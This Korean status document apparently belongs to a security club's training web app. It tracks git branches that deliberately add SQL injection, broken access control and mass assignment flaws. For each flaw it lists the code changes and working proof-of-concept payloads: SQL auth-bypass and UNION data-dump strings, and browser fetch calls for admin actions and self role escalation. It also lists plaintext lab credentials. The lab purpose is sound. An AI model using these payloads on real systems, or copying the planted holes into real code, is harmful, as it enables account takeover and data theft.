# 취약점 구현 현황

보안 동아리 실습용으로 의도적 취약점을 심는 프로젝트.
브랜치 전략: `main` = 안전한 원본 / `vuln/<name>` = 취약점별 작업 브랜치.

## 브랜치 현황

| 브랜치 | 커밋 | 상태 | 푸시 |
|---|---|---|---|
| `main` | f2d4be1 | 안전한 원본 (origin/main 동기화) | — |
| `vuln/sql-injection` | 4190162 | 구현 완료 | ❌ 미푸시 |
| `vuln/broken-access-control` | 933ebc9 | 구현 완료 | ❌ 미푸시 |
| `vuln/mass-assignment` | 9d8265c | 구현 완료 | ❌ 미푸시 |

---

## #1. SQL Injection (OWASP A03:2021)

**브랜치**: `vuln/sql-injection`
**담당**: 김태윤
**대상 엔드포인트**: `/auth/login`, `/board/?title=`, `/admin/users?name=`

### 변경 파일
- `blueprints/auth.py` — login()에서 raw SQL concat (id + pw)
- `blueprints/board.py` — board_list에서 title LIKE에 f-string 삽입
- `blueprints/admin.py` — get_users에서 name LIKE에 f-string 삽입
- `db/init.sql` — 14개 계정 비밀번호 평문화 (admin/admin1234, user01/user01, ..., guest/guest)
- `models/user.py` — generate_password_hash / check_password_hash 제거

### 사전 준비 (필수)
init.sql 변경사항을 적용하려면 DB 재초기화 필요:
```powershell
docker compose down -v
docker compose up -d
```

### 검증용 PoC
**시나리오 1: 인증 우회 (admin으로 로그인)**
- `/auth/login` 페이지 접속
- ID: `admin' OR '1'='1' --`
- PW: 아무거나 (예: `x`)
- 기대 결과: admin 계정으로 로그인됨 → 우상단에 "관리자" 표시 / `/admin/*` 접근 가능

**시나리오 2: UNION-based 데이터 탈취 (게시판 검색)**
- URL 직접 입력: `/board/?title=%' UNION SELECT user_idx,user_id,password,role,email,name,NOW() FROM users-- `
- 기대 결과: 게시글 목록 자리에 14명의 user_id/평문 비밀번호 등이 노출됨

**시나리오 3: 관리자 회원 목록 검색 SQLi**
- 관리자 로그인 후 `/admin/users?name=%' UNION SELECT 1,user_id,password,name,role,email,NOW(),NOW() FROM users-- `
- 기대 결과: JSON 응답에 모든 사용자 정보 노출 (단, `password` 키는 [admin.py:100](blueprints/admin.py#L100)에서 pop되므로 다른 컬럼 슬롯에 password를 배치해야 함)

---

## #7. Broken Access Control (OWASP A01:2021)

**브랜치**: `vuln/broken-access-control`
**담당**: 김태윤
**대상 엔드포인트**: `/admin/*` (10개 라우트)

### 변경 파일
- `blueprints/admin.py`
  - `login_required` 신규 정의 (로그인 여부만 검사)
  - 기존 `admin_required`는 정의만 남기고 미사용
  - 10개 라우트의 `@admin_required` → `@login_required`로 교체

### 검증용 PoC
**시나리오: 일반 USER가 관리자 기능 호출**
- USER 계정(`user01` / `user01`)으로 로그인
- 다음 순서로 시도:
  1. 브라우저에서 `/admin/users/list` 접속 → **회원 목록 페이지가 보여야 함** (안전한 코드면 403)
  2. 개발자도구 콘솔에서:
     ```js
     fetch('/admin/users?per_page=100').then(r=>r.json()).then(console.log)
     ```
     → 14명 회원 정보 JSON 출력
  3. 임의 회원 삭제:
     ```js
     fetch('/admin/users/2', {method:'DELETE'}).then(r=>r.json()).then(console.log)
     ```
     → "회원 및 연관 데이터가 삭제되었습니다." 응답
  4. 공지 작성:
     ```js
     const fd = new FormData();
     fd.append('title','PWNED'); fd.append('content','일반 사용자가 작성함');
     fetch('/admin/notices', {method:'POST', body:fd}).then(r=>r.json()).then(console.log)
     ```
     → board_id 반환, `/board/`에 공지로 노출

---

## #11. Mass Assignment (OWASP A01:2021)

**브랜치**: `vuln/mass-assignment`
**담당**: 김태윤
**대상 엔드포인트**: `/mypage/profile` (POST)

### 변경 파일
- `blueprints/mypage.py`
  - update_profile에서 `request.form.get('role')` 추가 수신
  - role 값이 있으면 UPDATE 쿼리에 함께 반영
  - 세션 `user_role`도 즉시 갱신 (재로그인 없이 효과 확인 가능)

### 검증용 PoC
**시나리오: USER → ADMIN 셀프 권한 상승**
- USER 계정(`user01` / `user01`)으로 로그인
- 마이페이지 접속 → 개발자도구 콘솔:
  ```js
  const fd = new FormData();
  fd.append('name','user01');
  fd.append('email','user01@security.lab');
  fd.append('role','ADMIN');
  fetch('/mypage/profile', {method:'POST', body:fd}).then(()=>location.reload());
  ```
- 기대 결과:
  - DB의 `user01` row.role = 'ADMIN'
  - 세션 `user_role` = 'ADMIN'
  - 새로고침 시 우상단 "관리자" 배지 표시
  - `/admin/users/list` 접근 가능 (Broken Access Control과 무관하게 main 브랜치에서도 동작)

---

## 런타임 검증 절차

### 단일 브랜치만 검증할 때
```powershell
# 1. 검증할 브랜치로 체크아웃
git checkout vuln/sql-injection      # 또는 다른 vuln 브랜치

# 2. SQLi 브랜치만: DB 재초기화 (init.sql 변경분 적용)
docker compose down -v
docker compose up -d --build

# 3. 다른 vuln 브랜치는 빌드만
docker compose up -d --build

# 4. http://localhost:3002 접속해서 위 PoC 시나리오 실행
```

### 여러 취약점을 동시에 검증할 때
브랜치를 합쳐야 함. 임시 통합 브랜치 권장:
```powershell
git checkout -b vuln/integration main
git merge vuln/sql-injection vuln/broken-access-control vuln/mass-assignment
# 충돌 발생 가능성 있음 (특히 admin.py — SQLi와 BAC 둘 다 수정함)
```

### 각 PoC 후 정리
```powershell
# 다음 브랜치 검증 전, 변경된 DB·세션 초기화
docker compose down -v
docker compose up -d
```

---

## 푸시 전 체크리스트

- [ ] 위 PoC 3종 모두 로컬에서 동작 확인
- [ ] `main` 브랜치는 `origin/main`과 동일 (취약점 없음) 확인: `git log main..origin/main` 결과 비어있어야 정상
- [ ] 푸시 대상은 `vuln/*` 브랜치만 (main 직푸시 금지 — CI/CD 자동 배포로 운영서버 취약화)
- [ ] 푸시 명령:
  ```powershell
  git push -u origin vuln/sql-injection
  git push -u origin vuln/broken-access-control
  git push -u origin vuln/mass-assignment
  ```

## 미구현 항목 (분담표 기준)

| # | 취약점 | 담당 | 상태 |
|---|---|---|---|
| 2 | Stored XSS | 정현정 | 미시작 |
| 3 | Reflected XSS | 정현정 | 미시작 |
| 5 | IDOR | 강예손 | 미시작 |
| 6 | 파일 업로드 취약점 | 강예손 | 미시작 |
| 8 | SSTI | 미정 | 미시작 |
| 9 | Path Traversal | 강예손 | 미시작 |
| 10 | MySQL FILE 권한 남용 | 강예손 | 미시작 |
| 12 | 세션 위조 (Weak Secret Key) | 정현정 | 미시작 |
